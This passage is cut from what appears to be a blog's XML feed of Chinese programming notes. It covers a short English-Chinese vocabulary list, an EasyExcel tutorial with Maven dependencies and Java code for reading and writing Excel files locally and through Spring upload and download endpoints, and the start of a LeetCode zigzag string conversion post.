        <content type="html"><![CDATA[<h1 id="Professional-Vocabulary-Accumulation-009"><a href="#Professional-Vocabulary-Accumulation-009" class="headerlink" title="Professional Vocabulary Accumulation_009"></a>Professional Vocabulary Accumulation_009</h1><ul><li>The method allows to retrieve items according to the given parameters.</li><li>此方法允许根据给定的参数获取监控项。</li><li>inlay hints</li><li>内置的提醒</li><li>Contains</li><li>包括</li><li>use a like with ‘%’ wildcard added to the beginning and end.</li><li>使用在开头和结尾添加一个 ‘%’ 的通配符</li><li>the equal to bind value.</li><li>等于绑定值</li><li>the root query bean instance.</li><li>根查询Bean实例</li><li>navigate to previous declared variable ‘ids’</li><li>导航到之前声明的变量 ‘ids’</li><li>shows project statistic</li><li>显示项目统计信息</li></ul>]]></content>
      
      
      <categories>
          
          <category> 专业词汇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 专业词汇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EasyExcel Manual</title>
      <link href="/blog/c67f80b7.html/"/>
      <url>/blog/c67f80b7.html/</url>
      
        <content type="html"><![CDATA[<h1 id="EasyExcel-Manual"><a href="#EasyExcel-Manual" class="headerlink" title="EasyExcel Manual"></a>EasyExcel Manual</h1><h2 id="一：引入依赖"><a href="#一：引入依赖" class="headerlink" title="一：引入依赖"></a>一：引入依赖</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--excel操作工具--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>easyexcel<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--日期格式化工具--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>joda-time<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>joda-time<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.12.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--实体工具--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--测试工具--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--json工具--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.19<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--spring web--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="二：代码模板"><a href="#二：代码模板" class="headerlink" title="二：代码模板"></a>二：代码模板</h2><h3 id="（1）实体类"><a href="#（1）实体类" class="headerlink" title="（1）实体类"></a>（1）实体类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.easyexcel.domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.annotation.ExcelIgnore;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.annotation.ExcelProperty;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.EqualsAndHashCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@EqualsAndHashCode</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoData</span> &#123;</span><br><span class="line">    <span class="meta">@ExcelProperty(&quot;字符串标题&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String string;</span><br><span class="line">    <span class="meta">@ExcelProperty(&quot;日期标题&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Date date;</span><br><span class="line">    <span class="meta">@ExcelProperty(&quot;数字标题&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Double doubleData;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 忽略这个字段</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ExcelIgnore</span></span><br><span class="line">    <span class="keyword">private</span> String ignore;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（2）核心类"><a href="#（2）核心类" class="headerlink" title="（2）核心类"></a>（2）核心类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.easyexcel.common;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.aiyingke.easyexcel.domain.DemoData;</span><br><span class="line"><span class="keyword">import</span> cn.aiyingke.easyexcel.dto.DemoDAO;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.context.AnalysisContext;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.read.listener.ReadListener;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.util.ListUtils;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 17:15 2022/11/20</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoDataListener</span> <span class="keyword">implements</span> <span class="title class_">ReadListener</span>&lt;DemoData&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">BATCH_COUNT</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">private</span> List&lt;DemoData&gt; cachedDataList = ListUtils.newArrayListWithExpectedSize(BATCH_COUNT);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> DemoDAO demoDAO;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DemoDataListener</span><span class="params">()</span> &#123;</span><br><span class="line">        demoDAO = <span class="keyword">new</span> <span class="title class_">DemoDAO</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DemoDataListener</span><span class="params">(DemoDAO demoDAO)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.demoDAO = demoDAO;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(DemoData data, AnalysisContext context)</span> &#123;</span><br><span class="line">        System.out.println(JSON.toJSONString(data));</span><br><span class="line">        cachedDataList.add(data);</span><br><span class="line">        <span class="keyword">if</span> (cachedDataList.size() &gt;= BATCH_COUNT) &#123;</span><br><span class="line">            saveData();</span><br><span class="line">            cachedDataList = ListUtils.newArrayListWithExpectedSize(BATCH_COUNT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doAfterAllAnalysed</span><span class="params">(AnalysisContext context)</span> &#123;</span><br><span class="line">        saveData();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">saveData</span><span class="params">()</span> &#123;</span><br><span class="line">        demoDAO.save(cachedDataList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（3）传输层"><a href="#（3）传输层" class="headerlink" title="（3）传输层"></a>（3）传输层</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.easyexcel.dto;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.aiyingke.easyexcel.domain.DemoData;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 17:16 2022/11/20</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoDAO</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">(List&lt;DemoData&gt; list)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;insert&quot;</span> + list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（4）本地读写"><a href="#（4）本地读写" class="headerlink" title="（4）本地读写"></a>（4）本地读写</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.easyexcel.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.aiyingke.easyexcel.common.DemoDataListener;</span><br><span class="line"><span class="keyword">import</span> cn.aiyingke.easyexcel.domain.DemoData;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.EasyExcel;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.util.ListUtils;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 16:55 2022/11/20</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EasyTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;DemoData&gt; <span class="title function_">data</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;DemoData&gt; list = ListUtils.newArrayList();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="type">DemoData</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DemoData</span>();</span><br><span class="line">            data.setString(<span class="string">&quot;字符串&quot;</span> + i);</span><br><span class="line">            data.setDate(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">            data.setDoubleData(<span class="number">0.56</span>);</span><br><span class="line">            list.add(data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getPath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">relativelyPath</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line">        System.out.println(relativelyPath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">PATH</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>) + <span class="string">&quot;\\data\\&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">simpleWrite</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> PATH + <span class="string">&quot;EasyTest.xlsx&quot;</span>;</span><br><span class="line">        EasyExcel.write(fileName, DemoData.class).sheet(<span class="string">&quot;模板&quot;</span>).doWrite(<span class="built_in">this</span>::data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">simpleRead</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> PATH + <span class="string">&quot;EasyTest.xlsx&quot;</span>;</span><br><span class="line">        EasyExcel.read(fileName, DemoData.class, <span class="keyword">new</span> <span class="title class_">DemoDataListener</span>()).sheet().doRead();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（5）Web读写"><a href="#（5）Web读写" class="headerlink" title="（5）Web读写"></a>（5）Web读写</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.easyexcel.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.aiyingke.easyexcel.common.DemoDataListener;</span><br><span class="line"><span class="keyword">import</span> cn.aiyingke.easyexcel.domain.DemoData;</span><br><span class="line"><span class="keyword">import</span> cn.aiyingke.easyexcel.dto.DemoDAO;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.EasyExcel;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.util.ListUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> DemoDAO demoDao;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;DemoData&gt; <span class="title function_">data</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;DemoData&gt; list = ListUtils.newArrayList();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="type">DemoData</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DemoData</span>();</span><br><span class="line">            data.setString(<span class="string">&quot;字符串&quot;</span> + <span class="number">0</span>);</span><br><span class="line">            data.setDate(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">            data.setDoubleData(<span class="number">0.56</span>);</span><br><span class="line">            list.add(data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;download&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">download</span><span class="params">(HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet&quot;</span>);</span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> URLEncoder.encode(<span class="string">&quot;测试&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>).replaceAll(<span class="string">&quot;\\+&quot;</span>, <span class="string">&quot;%20&quot;</span>);</span><br><span class="line">        response.setHeader(<span class="string">&quot;Content-disposition&quot;</span>, <span class="string">&quot;attachment;filename*=utf-8&#x27;&#x27;&quot;</span> + fileName + <span class="string">&quot;.xlsx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        EasyExcel.write(response.getOutputStream(), DemoData.class).sheet(<span class="string">&quot;模板&quot;</span>).doWrite(data());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;upload&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">upload</span><span class="params">(MultipartFile file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        EasyExcel.read(file.getInputStream(), DemoData.class, <span class="keyword">new</span> <span class="title class_">DemoDataListener</span>(demoDao)).sheet().doRead();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java开发手册 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode_Z字形变换</title>
      <link href="/blog/f5d7a02b.html/"/>
      <url>/blog/f5d7a02b.html/</url>
      
        <content type="html"><![CDATA[<h1 id="Z-字形变换"><a href="#Z-字形变换" class="headerlink" title="Z 字形变换"></a>Z 字形变换</h1><h2 id="一：题目"><a href="#一：题目" class="headerlink" title="一：题目"></a>一：题目</h2><p>将一个给定字符串 <code>s</code> 根据给定的行数 <code>numRows</code> ，以从上往下、从左到右进行 Z 字形排列。</p><p>比如输入字符串为 <code>&quot;PAYPALISHIRING&quot;</code> 行数为 <code>3</code> 时，排列如下：</p><p><img src="/blog/f5d7a02b.html/image-20221112223949179.png"></p><p>之后，你的输出需要从左往右逐行读取，产生出一个新的字符串，比如：<code>&quot;PAHNAPLSIIGYIR&quot;</code>。</p><h2 id="二：实例"><a href="#二：实例" class="headerlink" title="二：实例"></a>二：实例</h2><p><strong>示例 1：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;PAYPALISHIRING&quot;, numRows = 3</span><br><span class="line">输出：&quot;PAHNAPLSIIGYIR&quot;</span><br></pre></td></tr></table></figure><p><strong>示例 2：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;PAYPALISHIRING&quot;, numRows = 4</span><br><span class="line">输出：&quot;PINALSIGYAHRPI&quot;</span><br><span class="line">解释：</span><br><span class="line">P     I    N</span><br><span class="line">A   L S  I G</span><br><span class="line">Y A   H R</span><br><span class="line">P     I</span><br></pre></td></tr></table></figure><p><strong>示例 3：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;A&quot;, numRows = 1</span><br><span class="line">输出：&quot;A&quot;</span><br></pre></td></tr></table></figure><h2 id="三：提示"><a href="#三：提示" class="headerlink" title="三：提示"></a>三：提示</h2><ul><li><code>1 &lt;= s.length &lt;= 1000</code></li><li><code>s</code> 由英文字母（小写和大写）、<code>&#39;,&#39;</code> 和 <code>&#39;.&#39;</code> 组成</li><li><code>1 &lt;= numRows &lt;= 1000</code></li></ul><h2 id="四：算法实现"><a href="#四：算法实现" class="headerlink" title="四：算法实现"></a>四：算法实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> leetCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span 